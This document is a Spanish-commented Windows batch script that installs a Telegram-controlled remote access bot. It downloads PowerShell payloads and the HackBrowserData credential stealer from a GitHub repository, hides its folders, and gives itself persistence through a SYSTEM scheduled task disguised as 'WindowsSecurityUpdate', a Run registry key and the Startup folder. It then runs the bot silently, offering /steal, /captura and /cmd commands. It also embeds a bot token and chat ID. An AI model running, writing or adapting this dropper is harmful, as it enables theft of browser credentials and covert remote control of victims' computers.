@echo off
setlocal EnableDelayedExpansion

:: ============================================
:: CONFIGURACION
:: ============================================
set "TOKEN=8902397273:AAGQiKdAuC9AxPGezDEjJ-NJxMVZMNKMSTE"
set "CHAT_ID=6131889274"

set "BOT_URL=https://raw.githubusercontent.com/mayki35/win11_BOT/refs/heads/main/bot.ps1"
set "WORKER_URL=https://raw.githubusercontent.com/mayki35/win11_BOT/refs/heads/main/steal_worker.ps1"
set "HBD_URL=https://raw.githubusercontent.com/mayki35/win11_BOT/refs/heads/main/hackbrowserdata.exe"

:: ============================================
:: RUTAS
:: ============================================
set "SCRIPT_DIR=%~dp0"
set "CARPETA=%appdata%\CarpetaDos"
set "BOT_PATH=%CARPETA%\bot.ps1"
set "WORKER_PATH=%CARPETA%\steal_worker.ps1"
set "HBD_PATH=%CARPETA%\hackbrowserdata.exe"
set "HBD_LOCAL=%SCRIPT_DIR%hackbrowserdata.exe"
set "NOMBRE_TAREA=WindowsSecurityUpdate"

echo ========================================
echo  Instalador de Bot Telegram
echo  Con persistencia automatica
echo ========================================
echo.
echo Directorio del instalador: %SCRIPT_DIR%
echo.

if not exist "%appdata%\CarpetaUno" mkdir "%appdata%\CarpetaUno"
if not exist "%CARPETA%" mkdir "%CARPETA%"
attrib +h +s +r "%appdata%\CarpetaUno" 2>nul
attrib +h +s +r "%CARPETA%" 2>nul

echo [+] Carpetas creadas y ocultas
echo.

:: ============================================
:: DESCARGAR bot.ps1
:: ============================================
echo [+] Descargando bot.ps1...
powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Invoke-WebRequest -Uri '%BOT_URL%' -OutFile '%BOT_PATH%' -TimeoutSec 60; exit 0 } catch { exit 1 }"
if errorlevel 1 (
    echo [-] ERROR: No se pudo descargar bot.ps1
    pause
    exit /b 1
)

:: ============================================
:: DESCARGAR steal_worker.ps1
:: ============================================
echo [+] Descargando steal_worker.ps1...
powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Invoke-WebRequest -Uri '%WORKER_URL%' -OutFile '%WORKER_PATH%' -TimeoutSec 60; exit 0 } catch { exit 1 }"
if errorlevel 1 (
    echo [-] ERROR: No se pudo descargar steal_worker.ps1
    pause
    exit /b 1
)

:: ============================================
:: OBTENER hackbrowserdata.exe
:: ============================================
echo [+] Verificando hackbrowserdata.exe...

if exist "%HBD_LOCAL%" (
    echo [+] Encontrado junto al instalador
    copy /Y "%HBD_LOCAL%" "%HBD_PATH%" >nul 2>&1
)

if not exist "%HBD_PATH%" (
    echo [+] Descargando hackbrowserdata.exe desde GitHub...
    powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue'; try { Invoke-WebRequest -Uri '%HBD_URL%' -OutFile '%HBD_PATH%' -TimeoutSec 300 -UseBasicParsing; if (Test-Path '%HBD_PATH%') { exit 0 } else { exit 1 } } catch { exit 1 }"
)

if not exist "%HBD_PATH%" (
    echo.
    echo [-] ERROR: No se pudo obtener hackbrowserdata.exe
    pause
    exit /b 1
)

for %%F in ("%HBD_PATH%") do set "SIZE=%%~zF"
echo [+] HackBrowserData verificado: !SIZE! bytes
echo.

:: ============================================
:: PERSISTENCIA
:: ============================================
echo [+] Configurando persistencia...

set "VBS_PATH=%CARPETA%\runner.vbs"
(
    echo Set WshShell = CreateObject("WScript.Shell"^)
    echo WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""%BOT_PATH%"" -Token ""%TOKEN%"" -ChatId ""%CHAT_ID%""", 0, False
    echo Set WshShell = Nothing
) > "%VBS_PATH%"

schtasks /Create /TN "%NOMBRE_TAREA%" /TR "wscript.exe ""%VBS_PATH%""" /SC ONSTART /RU SYSTEM /RL HIGHEST /F >nul 2>&1
if %errorlevel% neq 0 (
    schtasks /Create /TN "%NOMBRE_TAREA%" /TR "wscript.exe ""%VBS_PATH%""" /SC ONSTART /RU %USERNAME% /F >nul 2>&1
)

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%NOMBRE_TAREA%" /t REG_SZ /d "wscript.exe ""%VBS_PATH%""" /f >nul 2>&1

set "STARTUP_PATH=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
copy /Y "%VBS_PATH%" "%STARTUP_PATH%\%NOMBRE_TAREA%.vbs" >nul 2>&1

powershell -NoProfile -ExecutionPolicy Bypass -Command "$action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument '%VBS_PATH%'; $trigger = New-ScheduledTaskTrigger -AtLogOn; $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable; Register-ScheduledTask -TaskName '%NOMBRE_TAREA%_Backup' -Action $action -Trigger $trigger -Settings $settings -Force" >nul 2>&1

echo [+] Persistencia configurada
echo.

echo ========================================
echo  Instalacion completada
echo ========================================
echo.
echo Archivos instalados:
echo   - %BOT_PATH%
echo   - %WORKER_PATH%
echo   - %HBD_PATH%
echo.
echo El bot arrancara automaticamente:
echo   - Al iniciar Windows
echo   - Al iniciar sesion
echo.
echo Comandos:
echo   /steal
echo   /captura
echo   /cmd comando
echo   /help
echo.
echo Iniciando bot...
wscript.exe "%VBS_PATH%"
echo [+] Bot iniciado en segundo plano
pause
